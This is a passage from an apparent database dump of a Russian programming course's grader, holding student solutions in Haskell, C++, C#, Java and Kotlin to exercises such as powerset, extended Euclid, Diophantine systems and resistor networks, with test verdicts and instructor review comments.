(1618, 56, 'tonyo', '2012-10-07 10:36:44', 1, '-- в упор не понимаю, как можно эту задачу сделать с list comprehension...\r\n   --- Это мы разберем. Но, смотите, если k == 2, то ответ будет\r\n   --- [[x1,x2] | x1<-[1..n], x2<-[1..n]] а если k == 3, то\r\n   --- [[x1,x2,x3] | x1<-[1..n], x2<-[1..n], x3<-[1..n]]\r\n   --- и, мне кажется, примерно понятно, как это обобщить\r\nallLists n 1 = map (x -> [x]) [1..n]\r\nallLists n k = foldr (x y -> (map (x:) subAllLists) ++ y) [] [1..n]\r\n        where subAllLists = allLists n (k-1)', '<br/>Тесты успешно пройдены!'),
(1619, 54, 'tonyo', '2012-10-07 10:44:50', 1, 'data Scheme = Par Scheme Scheme | Ser Scheme Scheme | Res Double\r\n\r\ntotalResistance (Par x y) = r1*r2 / (r1+r2)\r\n    where r1 = totalResistance x; r2 = totalResistance y\r\n\r\ntotalResistance (Ser x y) = totalResistance x + totalResistance y\r\ntotalResistance (Res r) = r\r\n', '<br/>Тесты успешно пройдены!'),
(1620, 44, 'hasp', '2012-10-07 11:39:42', 0, 'myGcd a 0 = a\r\nmyGcd a b = myGcd b (a `mod` b)\r\n\r\nmEE a 0 с = if a == 0 then (if с == 0 then [1, 0, 1, 0] else []) else (if mod с a == 0 then [0, с `div` a, 1, 0] else [])\r\nmEE a b c = let a1 = a `mod` b in let ans = mEE b a1 c in if null ans then [] else \r\n						let [p, x, q, y] = ans in let step = a `div` b in [q, y, p - step*q, x - step*y]\r\n			 \r\ndioph (a:b:c:d:[]) (k:l:m:n:[]) = \r\n  let [a1, b1, c1, d1, k1, l1, m1] = [a, b, c, d, b*k - l*a, c*k - m*a, d*k - n*a] in \r\n  if [k1, l1, m1] == [0, 0, 0] then \r\n	if a1 == 0 then (let ant = mEE b1 c1 d1 in if null ant then [0,0,0] else let [_, y, _, z] = ant in [0, y, z]) \r\n		   else let g = myGcd a b in let anv = mEE g c1 d1 in if null anv then [0,0,0] else let [_, _, _, z] = anv\r\n				 in let [_,x, _, y] = mEE a1 b1 (d1-z*c1) in [x,y,z]\r\n	else let anj = mEE k1 l1 m1 in if null anj then [0,0,0] else let [p,y,q,z]=anj in \r\n		let ank = mEE a1 (b1*p+c1*q) (d1 - b1*y - c1*z) in if null ank then [0,0,0] else let [_,x,_,i]=ank in [x,p*i+y,q*i+z]', 'Выражение имеет неправильное значение: let [x,y,z] = dioph [0,0,0,0] [0,1,0,3] in y'),
(1621, 44, 'hasp', '2012-10-07 11:46:35', 0, 'myGcd a 0 = a\r\nmyGcd a b = myGcd b (a `mod` b)\r\nmEE a 0 с = if a==0 then (if с==0 then [1,0,1,0] else []) else (if mod с a == 0 then [0,div c a,1,0] else [])\r\nmEE a b c = let a1=a `mod` b in let ans = mEE b a1 c in if null ans then [] else \r\n						let [p,x,q,y] = ans in let s=div a b in [q,y,p-s*q,x-s*y]\r\n			 \r\ndioph (a:b:c:d:[]) (k:l:m:n:[]) = \r\n  let [a1, b1, c1, d1, k1, l1, m1] = if k==0 then [a,b,c,d,l,m,n] else if a==0 then [k,l,m,n,b,c,d] else [a,b,c,d,b*k-l*a,c*k-m*a,d*k-n*a] in \r\n  if [k1,l1,m1] == [0,0,0] then \r\n	if a1 == 0 then (let ant = mEE b1 c1 d1 in if null ant then [0,0,0] else let [_,y,_,z]=ant in [0,y,z]) \r\n		   else let g = myGcd a b in let anv = mEE g c1 d1 in if null anv then [0,0,0] else let [_,_,_,z] = anv\r\n				 in let [_,x,_,y] = mEE a1 b1 (d1-z*c1) in [x,y,z]\r\n	else let anj = mEE k1 l1 m1 in if null anj then [0,0,0] else let [p,y,q,z]=anj in \r\n		let ank = mEE a1 (b1*p+c1*q) (d1 - b1*y - c1*z) in if null ank then [0,0,0] else let [_,x,_,i]=ank in [x,p*i+y,q*i+z]', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1622, 44, 'hasp', '2012-10-07 11:57:03', 1, 'myGcd a 0 = a\r\nmyGcd a b = myGcd b (a `mod` b)\r\n\r\nmEE a 0 с = if a == 0 then (if с == 0 then [1, 0, 1, 0] else []) else (if mod с a == 0 then [0, с `div` a, 1, 0] else [])\r\nmEE a b c = let a1 = a `mod` b in let ans = mEE b a1 c in if null ans then [] else let [p,x,q,y] = ans in let s = div a b in [q,y,p-s*q,x-s*y]\r\n			 \r\ndioph (a:b:c:d:[]) (k:l:m:n:[]) = \r\n  let [a1,b1,c1,d1,k1,l1,m1]=if k==0 then [a,b,c,d,l,m,n] else if a==0 then [k,l,m,n,b,c,d] else [a,b,c,d,b*k-l*a,c*k-m*a,d*k-n*a] in \r\n  if [k1,l1,m1] == [0,0,0] then \r\n	if a1 == 0 then (let ant = mEE b1 c1 d1 in if null ant then [0,0,0] else let [_,y,_,z] = ant in [0,y,z]) \r\n		   else let g = myGcd a b in let anv = mEE g c1 d1 in if null anv then [0,0,0] else let [_,_,_,z] = anv\r\n				 in let [_,x,_,y] = mEE a1 b1 (d1-z*c1) in [x,y,z]\r\n	else let anj = mEE k1 l1 m1 in if null anj then [0,0,0] else let [p,y,q,z]=anj in \r\n		let ank = mEE a1 (b1*p+c1*q) (d1-b1*y-c1*z) in if null ank then [0,0,0] else let [_,x,_,i]=ank in [x,p*i+y,q*i+z]', '<br/>Тесты успешно пройдены!'),
(1623, 50, 'tonyo', '2012-10-07 12:34:12', 1, '#include <iostream>\r\n\r\n#include <list>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nclass Node\r\n\r\n{\r\n\r\npublic:\r\n\r\n    Node *right, *left;\r\n\r\n    int data;\r\n\r\n\r\n\r\n    Node()\r\n        --- Можно было задать умолчание у конструктора с параметром, а этот конструктор вовсе не писать.\r\n    {\r\n\r\n        nodeInit();\r\n\r\n    }\r\n\r\n\r\n\r\n    Node(int newdata)\r\n\r\n    {\r\n\r\n        nodeInit(newdata);\r\n\r\n    }\r\n\r\n\r\n\r\n    void nodeInit(int newdata = 0)\r\n\r\n    {\r\n\r\n        right = 0;\r\n\r\n        left = 0;\r\n\r\n        data = newdata;\r\n\r\n    }\r\n\r\n};\r\n\r\n\r\n\r\nclass BinTree\r\n\r\n{\r\n\r\npublic:\r\n\r\n    Node *root;\r\n\r\n};\r\n\r\n\r\n\r\n\r\n\r\ntemplate <typename Func>\r\n\r\nbool any(Func f, BinTree bt)\r\n    --- Немного лучше, на самом деле, const BinTree& bt\r\n{\r\n\r\n    list<Node*> l;\r\n\r\n    l.push_back(bt.root);\r\n\r\n    while (!l.empty())\r\n\r\n    {\r\n\r\n        Node *nextnode = l.front(); \r\n\r\n        if (f(nextnode->data))\r\n\r\n        {\r\n\r\n            return true;\r\n\r\n        }\r\n\r\n        if (nextnode->right != 0)\r\n\r\n        {\r\n\r\n            l.push_back(nextnode->right);\r\n\r\n        }\r\n\r\n        if (nextnode->left != 0)\r\n\r\n        {\r\n\r\n            l.push_back(nextnode->left);\r\n\r\n        }\r\n\r\n        l.pop_front();\r\n\r\n    }\r\n\r\n    return false;\r\n\r\n}\r\n\r\n\r\n\r\nbool isEven(int x)\r\n\r\n{\r\n\r\n    return x%2 == 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nint main()\r\n\r\n{\r\n\r\n    Node n1(5), n2(7), n3(9), n4(14), n5(15);\r\n\r\n    BinTree bt;\r\n\r\n\r\n\r\n    n1.left = &n2;\r\n\r\n    n1.right = &n3;\r\n\r\n    n2.left = &n4;\r\n\r\n    n4.right = &n5;\r\n\r\n\r\n\r\n    bt.root = &n1;\r\n\r\n\r\n\r\n    cout << any( [](int x) {return x%2 == 0;}, bt) ;\r\n\r\n    cout << any( isEven, bt) ;\r\n\r\n\r\n\r\n    return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1624, 56, '3607492', '2012-10-07 12:44:16', 1, 'allLists n 0 = [[]]\r\nallLists n k =[x:xs|x<-[1..n], xs<-allLists n (k-1)]', '<br/>Тесты успешно пройдены!'),
(1625, 43, '355679', '2012-10-07 12:52:05', 1, 'swap (a,b) = (b,a)\r\n\r\n\r\n\r\neuclid a b =\r\n\r\n  if (b > a) then\r\n\r\n    swap (euclid b a)\r\n      --- Это на самом деле можно не писать. ваш алгоритм и так будет работать\r\n  else if (b == 0) then\r\n\r\n    (1, 0)\r\n\r\n  else\r\n\r\n    let {\r\n\r\n      q = a `div` b;\r\n\r\n      r = a `mod` b;\r\n\r\n      (s, t) = euclid b r;\r\n         --- Точки с запятой и фигурные скобки вроде бы тут не нужны, Хаскел их расставит автоматически\r\n    } in (\r\n\r\n      (t, s - q * t)\r\n\r\n    )\r\n', '<br/>Тесты успешно пройдены!'),
(1626, 56, '2562137', '2012-10-07 12:54:52', 1, 'allLists n 0 = [[]]\r\nallLists n k = [x:xs | let subs = allLists n (k-1), x <- [1..n], xs <- subs]', '<br/>Тесты успешно пройдены!'),
(1627, 46, 'hasp', '2012-10-07 13:04:55', 1, '//Задачка на Котлине, запустить можно тут http://kotlin-demo.jetbrains.com/\r\nimport java.util.*\r\n\r\nfun find_if<T>(c: jet.Collection<T>, p: (T) -> Boolean): Iterator<T> {\r\n  val i = c.iterator()\r\n  \r\n  if (i.hasNext()) {\r\n    var c = i.next()\r\n    while (!p(c) && i.hasNext()) c = i.next()\r\n  }\r\n\r\n  return i\r\n}\r\n\r\nfun main(args : Array<String>) {\r\n  val l = Arrays.asList(1,2,3,5,9,7,11)\r\n  println(find_if(l, {(x: Int) -> x%2 == 0}).hasNext())\r\n}', '<br/>Тесты успешно пройдены!'),
(1628, 56, '355679', '2012-10-07 13:07:17', 0, 'powerset [] = [[]]\n\npowerset (x:xs) =\n\n  let {\n\n    ps = powerset xs\n\n  } in (\n\n    (map (cur -> x:cur) ps) ++ ps\n\n  )\n\n\n\nallLists n k = [xs | xs <- powerset [1..n], length xs == k]\n', 'Выражение имеет неправильное значение: length (allLists 3 3)'),
(1629, 45, 'hasp', '2012-10-07 13:10:54', 1, 'import java.util.*;\r\n\r\npublic class MyList<E> extends ArrayList<E> {\r\n    abstract class Predicate {abstract boolean satisfy(E e);}\r\n\r\n    MyList(E... e) {super(Arrays.asList(e));}\r\n\r\n    boolean any(Predicate p) {\r\n        for (E e : this) if (p.satisfy(e)) return true;\r\n        return false;\r\n    }\r\n\r\n    boolean all(Predicate p) {\r\n        for (E e : this) if (!p.satisfy(e)) return false;\r\n        return true;\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        MyList<MyList<Integer>> l = new MyList<MyList<Integer>>(\r\n                new MyList<Integer>(1,6,5,7), new MyList<Integer>(1,4,6,7,-1,0), new MyList<Integer>(2,5,9,-2,0)\r\n        );\r\n        boolean is = l.all(l.new Predicate() {\r\n            boolean satisfy(MyList<Integer> l) {\r\n                return l.any(l.new Predicate() {\r\n                    boolean satisfy(Integer i) {return i%2 == 0;}\r\n                });\r\n            }\r\n        });\r\n        System.out.println(is);\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1630, 47, '44060', '2012-10-07 13:28:42', 1, 'powerset [] = [[]]\r\npowerset (x:xs) =\r\n	rezult ++ map (y -> x:y) rezult\r\n   --- Или можно map (x:)\r\n	where rezult = powerset xs', '<br/>Тесты успешно пройдены!'),
(1631, 56, '44060', '2012-10-07 13:47:05', 1, 'allLists n 0 = [[]]\r\nallLists n k = [i:x | x <- allLists n (k-1), i <- [1..n]]', '<br/>Тесты успешно пройдены!'),
(1632, 56, '355679', '2012-10-07 14:02:42', 1, 'allLists n 0 = [[]]\r\n\r\nallLists n k = foldr\r\n\r\n  (xs res ->\r\n\r\n    (map\r\n\r\n      (y -> y:xs)\r\n\r\n      [1..n]\r\n\r\n    ) ++ res\r\n\r\n  )\r\n\r\n  []\r\n\r\n  ( allLists n (k - 1) )\r\n', '<br/>Тесты успешно пройдены!'),
(1633, 45, '3607492', '2012-10-07 14:12:19', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            int[][] array = new int[4][];\r\n            array[0] = new int[4]{ 1, 2, 3, 4 };\r\n            array[1] = new int[4]{ 1, 3, 3, 4 };\r\n            array[2] = new int[4]{ 1, 1, 3, 4 };\r\n            array[3] = new int[4]{ 1, 1, 3, 1 };\r\n            bool b = array.All(x => x.Any(z => z % 2 == 0)); // Верно, ли что все элементы в массиве положительные?\r\n\r\n            Console.WriteLine((b) ? "True" : "False");\r\n            Console.Read();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(1634, 43, '44060', '2012-10-07 14:37:09', 1, 'euclid a b = f a b 0\r\n \r\nf a b c| a < b = f b a 1\r\n         --    | b < 0 =  (0,0)\r\n               | (b == 0 && abs(a) /= 1) || (a == 0 && abs(b) /= 1) = (0, 0)\r\n  \r\nf a b d| b == 1 = (1, 1 - a)\r\n \r\n         	| (a == 0 && b == -1 && d == 0) = (0, -1)\r\n         	| (a == 0 && b == -1 && d == 1) = (-1, 0)\r\n                | (a == 1 && b == 0 && d == 0) = (1, 0)\r\n         	| (a == 1 && b == 0 && d == 1) = (0, 1)\r\n        	| b < 0  = f1 b (a `mod` b) 1 0 (- a `div` b) 1 d\r\n        	| b > 0 =  f2 b (a `mod` b) 1 0 (- a `div` b) 1 d\r\n         \r\nf1 a b c d e f g | b == -1 && g == 1 =\r\n			if b == -1 && g == 0 then (-c, -e)\r\n                        else f1 b (a `mod` b) (d + c * ( - a `div` b)) c \r\n                                      (f + e * ( - a `div` b)) e g\r\n\r\nf2 a b c d e f g| b == 1 && g == 1 = (e,c) \r\n			|b == 1 && g == 0 = (c, e)\r\n 			|otherwise = f2 b (a `mod` b) (d + c * ( - a `div` b)) c \r\n                                      (f + e * ( - a `div` b)) f g', '<br/>Тесты успешно пройдены!'),
(1635, 44, '3742311', '2012-10-07 14:50:14', 0, 'makeResult (y, z) d (e, f) = [y *e + z * f, y * d, z * d]\r\n\r\nsolveByEuclid a b (a1, a2) (b1, b2) n d (e, f)= if (mod a b) == 0 then (makeResult (b1 * (div n b), b2 * (div n b)) d (e, f)) else euclidtmp b (mod a b) (b1, b2) (a1 - (div a b) * b1, a2 - (div a b) * b2) n d (e, f)\r\n\r\nsolveSimplifyEqu [a, b, c] d (e, f) = solveByEuclid a b (1, 0) (0, 1) c d (e, f) \r\n\r\nsolveSimplifySystem [a, b, c] [k, l, m, n] = solveSimplifyEqu [l * a - b * k, m * a - c * k, n] a (-b, -c)\r\n\r\ndioph [a, b, c, 0] l = solveSimplifySystem [a, b, c] l\r\ndioph [a, b, c, d] [k, l, m, n] = dioph [(mod n d), k - a * (div n d), l - b * (div n d), m - c * (div n d)] [a, b, c, d]', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1636, 44, '3742311', '2012-10-07 14:57:00', 2, 'makeResult (y, z) d (e, f) = [y *e + z * f, y * d, z * d]\r\n\r\nsolveByEuclid a b (a1, a2) (b1, b2) n d (e, f)= if (mod a b) == 0 then (makeResult (b1 * (div n b), b2 * (div n b)) d (e, f)) else euclidtmp b (mod a b) (b1, b2) (a1 - (div a b) * b1, a2 - (div a b) * b2) n d (e, f)\r\n\r\nsolveSimplifyEqu [a, b, c] d (e, f) = solveByEuclid a b (1, 0) (0, 1) c d (e, f) \r\n\r\nsolveSimplifySystem [a, b, c] [k, l, m, n] = solveSimplifyEqu [l * a - b * k, m * a - c * k, n] a (-b, -c)\r\n\r\ndioph [a, b, c, 0] l = solveSimplifySystem [a, b, c] l\r\ndioph [a, b, c, d] [k, l, m, n] = dioph [k - a * (div n d), l - b * (div n d), m - c * (div n d), (mod n d)] [a, b, c, d]', 'Не удалось вычислить выражение "let [x,y,z] = dioph [1,1,1,6] [1,2,3,14] in (x+y+z, x+2*y+3*z)", проверьте правильность синтаксиса'),
(1637, 51, '82873297', '2012-10-07 15:12:39', 1, 'repeatFunc f 1 = f\r\n\r\nrepeatFunc f n = f.(repeatFunc f (n-1))\r\n', '<br/>Тесты успешно пройдены!'),
(1638, 52, '82873297', '2012-10-07 15:13:47', 1, 'repeatFunc f n = foldr (.) (x->x) (map (x->f) [1..n])\r\n', '<br/>Тесты успешно пройдены!'),
(1639, 53, '82873297', '2012-10-07 15:14:19', 1, 'coins n = [[k,l,m] | k <- [0..(div n 2)],\r\n\r\n                     l <- [0..(div n 3)],\r\n\r\n                     m <- [0..(div n 5)],\r\n\r\n                     k*2+l*3+m*5==n]\r\n', '<br/>Тесты успешно пройдены!'),
(1640, 47, '82873297', '2012-10-07 15:15:01', 1, 'powerset [] = [[]]\r\n\r\npowerset (x:xs) = ss ++ map (x:) ss\r\n\r\n                  where ss = powerset xs\r\n', '<br/>Тесты успешно пройдены!'),
(1641, 54, '82873297', '2012-10-07 16:34:38', 1, 'data Scheme = Resistance Double \r\n\r\n            | Series Scheme Scheme \r\n\r\n            | Parallel Scheme Scheme\r\n\r\n\r\n\r\ntotalResistance (Resistance res) = res\r\n\r\ntotalResistance (Series s1 s2) = (totalResistance s1)+(totalResistance s2)\r\n\r\ntotalResistance (Parallel s1 s2) = r1*r2/(r1+r2)\r\n\r\n                        where r1 = totalResistance s1\r\n\r\n                              r2 = totalResistance s2\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1642, 57, '355679', '2012-10-07 16:51:17', 2, '-- да, я знаю, что у меня генерится много идентичных схем, но я слишком устал, чтобы сейчас искать, где именно надо поправить --\r\n   --- Обнаружился у вас баг к сожалению.\r\n   --- Вот такой пример у вас дает False\r\n   ---   canMakeScheme [13, 7, 2, 3] 6\r\n   --- При этом если соеднинит последовательно 13 и 2 и с другой стороны 7 и 3, то получиться 15 и 10,\r\n   --- и если из соединить параллельно, но это 6. Сейчас добавлю такой тест.\r\n   --- Попробуйте исправить, пожалуйста. \r\n\r\n\r\n-- sublistsWithoutOneElement --\r\n\r\nswoe xs = swoe1 [] xs\r\n\r\n\r\n\r\nswoe1 _ [] = []\r\n\r\nswoe1 prefix (elem:tail) = (elem, prefix ++ tail) : (swoe1 (prefix ++ [elem]) tail)\r\n\r\n\r\n\r\ndata Scheme = Resist Double | Par Scheme Scheme | Seq Scheme Scheme deriving Show\r\n\r\n\r\n\r\nresist (Resist d) = d\r\n\r\nresist (Par s1 s2) = ((resist s1) * (resist s2)) / ((resist s1) + (resist s2))\r\n\r\nresist (Seq s1 s2) = (resist s1) + (resist s2)\r\n\r\n\r\n\r\nprependToAll resistanceValue schemesList = \r\n\r\n  let {\r\n\r\n    r = Resist resistanceValue;\r\n\r\n  } in (\r\n\r\n     foldr\r\n\r\n       ( s res -> (Par r s) : ( (Seq r s) : res ) )\r\n\r\n--       ( s res -> (Seq r s) : res )\r\n\r\n       []\r\n\r\n       schemesList\r\n\r\n  )\r\n\r\n\r\n\r\nschemes (r:[]) = [Resist r]\r\n\r\nschemes resistances =\r\n\r\n  let {\r\n\r\n    sLists = swoe resistances;\r\n\r\n  } in (\r\n\r\n    foldr\r\n\r\n      ((r, list) res ->\r\n\r\n        let {\r\n\r\n          sl = schemes list;\r\n\r\n        } in (\r\n\r\n           (prependToAll r sl) ++ res ++ sl\r\n\r\n        )\r\n\r\n      )\r\n\r\n      []\r\n\r\n      sLists\r\n\r\n  )\r\n\r\n\r\n\r\ncanMakeScheme rs r = length ( filter (s -> resist s == r) (schemes rs) ) > 0\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1643, 43, '4169333', '2012-10-07 17:14:21', 1, 'euclid a b= euclid1 a b 0 1 1 0\r\neuclid1 a 0 _ _ x2 y2 = if (a==1) then (x2,y2)\r\n			else error "Numbers are not prime"\r\neuclid1 a b x1 y1 x2 y2= euclid1 b r (x2-q*x1) (y2-q*y1) x1 y1\r\n	where\r\n		q= div a b\r\n		r= a - q*b', '<br/>Тесты успешно пройдены!'),
(1644, 57, '12206137', '2012-10-07 17:17:50', 1, 'import Data.Array\r\n\r\nimport Data.Bits\r\n\r\nimport Data.List\r\n\r\nimport Debug.Trace\r\n\r\n\r\n\r\n(|>) x f = f x\r\n\r\n\r\n\r\nbit2shift :: Int -> Int -> Int\r\n\r\nbit2shift acc 1 = acc\r\n\r\nbit2shift acc n = bit2shift (acc+1) (n `shiftR` 1)\r\n\r\n\r\n\r\ncollectBits :: [Int] -> Int -> Int -> [Int]\r\n\r\ncollectBits acc _ 0 = acc\r\n\r\ncollectBits acc shift num =\r\n\r\n    if num .&. shift == 0 then\r\n\r\n        collectBits acc (shift `shiftL` 1) num\r\n\r\n    else\r\n\r\n        collectBits (shift:acc) (shift `shiftL` 1) (num `xor` shift)\r\n\r\n\r\n\r\ncollectMasks accMasks [] m f =\r\n\r\n    case accMasks of\r\n\r\n        [mask] | mask == m -> []\r\n\r\n        otherwise -> f accMasks\r\n\r\n\r\n\r\ncollectMasks accMasks (b:bits) m f =\r\n\r\n    collect [] b bits\r\n\r\n    where\r\n\r\n        collect skipped mask [] = collectMasks (mask:accMasks) skipped m f\r\n\r\n        collect skipped mask (x:xs) =\r\n\r\n            (collect (x:skipped) mask xs) ++ (collect skipped (x .|. mask) xs)\r\n\r\n\r\n\r\nhandleMask rs m f =\r\n\r\n    let bits = collectBits [] 1 m in\r\n\r\n--    trace (show bits) $\r\n\r\n--    trace (show rs) $\r\n\r\n    case bits of\r\n\r\n        [bit] -> [rs!(bit2shift 0 bit)]\r\n\r\n        otherwise -> collectMasks [] bits m f\r\n\r\n\r\n\r\nreduce f (x:xs) = foldl (f) x xs\r\n\r\n\r\n\r\ncountSeries :: [Rational] -> Rational\r\n\r\ncountSeries = reduce (+)\r\n\r\ncountParallel :: [Rational] -> Rational\r\n\r\ncountParallel = reduce (x y -> x*y/(x+y))\r\n\r\nfuns = array (0,1) [(0,countParallel), (1,countSeries)]\r\n\r\n\r\n\r\ncollectCalcs'' acc [] f = [f acc]\r\n\r\ncollectCalcs'' acc (x:xs) f =\r\n\r\n    x\r\n\r\n    |> map (e -> collectCalcs'' (e:acc) xs f)\r\n\r\n    |> concat\r\n\r\n    \r\n\r\ncollectCalcs f list = collectCalcs'' [] list f\r\n\r\n\r\n\r\ncanMakeScheme rs_list m =\r\n\r\n    let n = length rs_list in\r\n\r\n    let lim = ((1::Int) `shiftL` n) - 1 in\r\n\r\n    let rs = listArray (0,n-1) rs_list in\r\n\r\n    let\r\n\r\n    a = array ((0,1), (1,lim))\r\n\r\n         [((connect, mask), handleMask rs mask (collectCalcs (funs!connect) . map (x -> a!(1-connect,x)) ))\r\n\r\n            | connect <- [0..1], mask <- [1..lim] ]\r\n\r\n    in\r\n\r\n    a |> elems\r\n\r\n      |> (any $ any (== m))\r\n', '<br/>Тесты успешно пройдены!'),
(1645, 49, '5772638', '2012-10-07 17:55:01', 1, ' public class BinTree\r\n\r\n    {\r\n\r\n        public int Node;\r\n\r\n        public BinTree LeftSTree;\r\n\r\n        public BinTree RightSTree;\r\n\r\n        public BinTree(int n, BinTree left, BinTree right)\r\n\r\n            {\r\n\r\n                Node = n;\r\n\r\n                LeftSTree = left;\r\n\r\n                RightSTree = right;\r\n\r\n            }\r\n\r\n        public Boolean MyAny(Predicate<int> f)\r\n\r\n        {\r\n\r\n            bool lres=false,rres=false,res=false;\r\n\r\n            if (LeftSTree != null) { lres = LeftSTree.MyAny(f); }\r\n\r\n            if (RightSTree != null) { rres = RightSTree.MyAny(f); }\r\n\r\n            if (f(Node)) { res = true; }\r\n\r\n            return lres||rres||res;\r\n   --- Вообще правильно, но давайте я вас попрошу немного усовершенствовать:\r\n   --- У вас в любом случае обходится все дерево. Но ведь, например, если мы нашли\r\n   --- нужную вершину в левом поддереве, то не правое поддерево, ни корень можно уже\r\n   --- не проверять. Попробуйте так сделать, пожалуйста. \r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            BinTree ltree = new BinTree(8,null,null);\r\n\r\n            BinTree rtree = new BinTree(7, null, null);\r\n\r\n            BinTree tree = new BinTree(1, ltree, rtree);\r\n\r\n            Console.WriteLine(tree.MyAny(x=>x%2==0));// true\r\n\r\n            Console.WriteLine(tree.MyAny(x=>x*3>100));//false\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n', '<br/>Тесты успешно пройдены!'),
(1646, 56, '397095', '2012-10-07 18:29:26', 1, 'allLists n k = lists n k [[]]\r\n\r\nlists _ 0 xss = xss\r\nlists n k xss = lists n (k-1) [(x:xs) | x <- [1..n], xs <- xss]', '<br/>Тесты успешно пройдены!'),
(1647, 54, 'Deutsche', '2012-10-07 19:02:07', 1, 'This problem was sent by email, accept it please', '<br/>Тесты успешно пройдены!'),
(1648, 51, '329842', '2012-10-07 19:16:32', 1, 'repeatFunc f n = if n == 1\r\n			   then f\r\n			   else f.repeatFunc f (n - 1)', '<br/>Тесты успешно пройдены!'),
(1649, 52, '329842', '2012-10-07 19:17:12', 2, 'repeatFunc f n = if n == 1\r\n		           then f\r\n			   else f.repeatFunc f (n - 1)\r\n   --- ??? Тут же нельзя использовать рекурсию, по условию', '<br/>Тесты успешно пройдены!'),
(1650, 43, 'Маргарита Нурмухаметова', '2012-10-07 19:20:10', 0, 'euclid_1 let e = [1,0,0,1]\r\n\neuclid_r a b = if a>b then a `mod` b else b `mod` a\r\n\neuclid_q a b = if a>b then a `div` b else b `div` a\r\n\neuclid a b = if euclid_1 a b == 0 then e12, e22\r\n\n                                  else xs = []e11 = e12, e12 = e11-((euclid_q a b)*e12) , e21 = e22, e22 = e21-((euclid_q a b)*e22);\r\n\n                                       euclid b euclid_r a b \n', 'Не удалось вычислить выражение "let (x,y) = euclid 3 5 in 3*x+5*y", проверьте правильность синтаксиса'),
(1651, 43, 'Маргарита Нурмухаметова', '2012-10-07 19:21:08', 1, 'euclid a b | d /= 1 = (0,0)\r\n\r\n           | otherwise = (x, y)\r\n\r\n  where\r\n\r\n    (d, x, y) = euclid'' a b 0 1 1 0\r\n\r\n\r\n\r\n    euclid'' a 0 _  _  x2 y2 = (a, x2, y2)\r\n\r\n    euclid'' a b x1 y1 x2 y2 = euclid'' b r (x2 - q * x1) (y2 - q * y1) x1 y1\r\n\r\n      where\r\n\r\n        (q, r) = a `quotRem` b\r\n', '<br/>Тесты успешно пройдены!'),
(1652, 45, '329842', '2012-10-07 19:31:25', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace AllAnyEven\r\n{\r\n    class Program\r\n    {\r\n        private static bool IsAllAnyEven(IEnumerable<IEnumerable<int>> param)\r\n        {\r\n            return param.All(inner => inner.Any(number => number % 2 == 0));\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            var input = new int[3][];\r\n            input[0] = new int[] { 1, 2, 3};\r\n            input[1] = new int[] { 5, 1, 3 };\r\n            input[2] = new int[] { 7, 2, 3 };\r\n            Console.WriteLine(IsAllAnyEven(input));\r\n            input[1][1] = 4;\r\n            Console.WriteLine(IsAllAnyEven(input));\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(1653, 44, '397095', '2012-10-07 19:52:02', 2, 'import Debug.Trace\r\n\r\n\r\n\r\n-- (x,y) from ax+by=1 when { gcd(a,b)=1 }\r\n\r\neu 0 _ = (0, 1)\r\n\r\neu a b = \r\n\r\n	let \r\n\r\n		(x1, y1) = eu (trace ("eu " ++ show a ++ " " ++ show b) (mod b a)) a\r\n\r\n	in\r\n\r\n		(y1 - (div b a) * x1, x1)\r\n\r\n\r\n\r\n-- (x0, y0, tx, ty) from ax+by=c when { c `mod` gcd(a,b) = 0 }\r\n\r\nsolve a b c =\r\n\r\n	let \r\n\r\n		g = gcd a b\r\n\r\n		a1 = div a g\r\n\r\n		b1 = div b g\r\n\r\n		c1 = div c g\r\n\r\n		(u, v) = eu a1 b1\r\n\r\n		(uu, vv) = (if a < 0 then (-u) else u, if b < 0 then (-v) else v)\r\n\r\n	in\r\n\r\n		trace ("solve " ++ show a ++ " " ++ show b ++ " " ++ show c ++ " = " ++ show (Lin (uu * c1) b1) ++ ", " ++ show (Lin (vv * c1) (-a1))) (Lin (uu * c1) b1, Lin (vv * c1) (-a1))\r\n\r\n\r\n\r\n\r\n\r\ndata Func = Lin Integer Integer | Any | NoAnswer\r\n\r\ninstance Show Func where\r\n\r\n	show (NoAnswer) = "NoAnswer"\r\n\r\n	show (Any) = "Any"\r\n\r\n	show (Lin a b) = show a ++ " + " ++ show b ++ "t"\r\n\r\ninstance Eq Func where\r\n\r\n	(==) NoAnswer NoAnswer = True\r\n\r\n	(==) _ NoAnswer = False\r\n\r\n	(==) NoAnswer _ = False\r\n\r\n\r\n\r\n-- Variable count checkers\r\n\r\ncheck xs = map (x -> if x == 0 then 0 else 1) xs\r\n\r\nisNoVar xs = sum (check xs) == 0\r\n\r\nisOneVar xs = sum (check xs) == 1\r\n\r\nisTwoVar xs = sum (check xs) == 2\r\n\r\nisThreeVar xs = sum (check xs) == 3\r\n\r\n\r\n\r\n-- [(x0, px), (y0, py), (z0, pz)]\r\n\r\nsolveOnly [a,b,c,d] =\r\n\r\n	let\r\n\r\n		no_answer = [NoAnswer,NoAnswer,NoAnswer]\r\n\r\n	in\r\n\r\n		if isTwoVar [a,b,c]\r\n\r\n		then\r\n\r\n			if a == 0\r\n\r\n			then let (yp,zp) = solve b c d in 